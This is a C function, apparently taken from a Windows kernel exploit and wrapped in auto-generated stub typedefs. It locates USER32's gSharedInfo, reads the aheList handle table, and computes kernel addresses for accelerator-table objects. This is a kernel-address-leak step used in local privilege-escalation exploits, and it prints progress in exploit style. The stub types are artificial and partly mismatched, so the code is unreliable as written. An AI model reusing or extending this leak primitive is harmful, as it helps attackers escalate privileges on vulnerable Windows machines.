
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int ULONGLONG ;
struct TYPE_2__ {scalar_t__ aheList; } ;
typedef TYPE_1__* PSHAREDINFO ;
typedef int * PHANDLEENTRY ;
typedef int LPCSTR ;
typedef int HMODULE ;
typedef scalar_t__ HACCEL ;
typedef int DWORD ;


 int GetLastError () ;
 scalar_t__ GetProcAddress (int ,int ) ;
 int object_number ;
 int printf (char*,int) ;

PHANDLEENTRY leak_table_kernel_address(HMODULE user32dll, HACCEL hAccel[object_number], PHANDLEENTRY handle_entry[object_number]) {
 int i;
 PSHAREDINFO gSharedInfo;
 ULONGLONG aheList;
 DWORD handle_entry_size = 0x18;

 gSharedInfo = (PSHAREDINFO)GetProcAddress(user32dll, (LPCSTR)"gSharedInfo");
 if (gSharedInfo == ((void*)0)) {
  printf("[!] Error while retrieving gSharedInfo: %d.\n", GetLastError());
  return ((void*)0);
 }
 aheList = (ULONGLONG)gSharedInfo->aheList;
 printf("[+] USER32!gSharedInfo located at: %I64x\n", (ULONGLONG)gSharedInfo);
 printf("[+] USER32!gSharedInfo->aheList located at: %I64x\n", (ULONGLONG)aheList);
 for (i = 0; i < object_number; i++) {
  handle_entry[i] = (PHANDLEENTRY)(aheList + ((ULONGLONG)hAccel[i] & 0xffff) * handle_entry_size);
 }
 return *handle_entry;
}
